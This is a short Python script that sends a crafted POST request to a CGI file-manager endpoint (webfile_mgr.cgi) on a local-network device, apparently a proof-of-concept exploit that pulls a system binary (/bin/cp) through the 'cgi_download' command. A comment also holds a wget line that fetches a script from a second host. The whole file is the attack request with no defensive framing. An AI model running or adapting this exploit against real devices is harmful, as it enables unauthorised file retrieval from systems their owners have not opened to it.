import requests

url = "http://192.168.31.10/cgi-bin/webfile_mgr.cgi"

headers = {
}

data = {
    "cmd": "cgi_download",
    "path": "/bin/cp",
    "name": "cp",
    "type": "File",
    "browser": "Mozilla"
}

# wget http://192.168.31.166:8876/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

